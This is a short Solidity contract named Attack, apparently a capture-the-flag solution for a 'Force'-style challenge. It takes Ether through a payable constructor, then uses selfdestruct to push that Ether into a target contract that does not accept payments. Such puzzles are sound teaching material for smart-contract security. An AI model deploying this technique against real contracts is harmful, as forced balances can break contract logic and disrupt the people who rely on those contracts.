// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Attack{

    //payable constructor for receiving Ether when contract is deployed
    constructor()payable{}
    
    //selfdestruct destorys current contract and sending 
    //any remaining Ether to address of _force
    function attack(Force _force)external{
        selfdestruct(payable(address(_force)));
    }   
}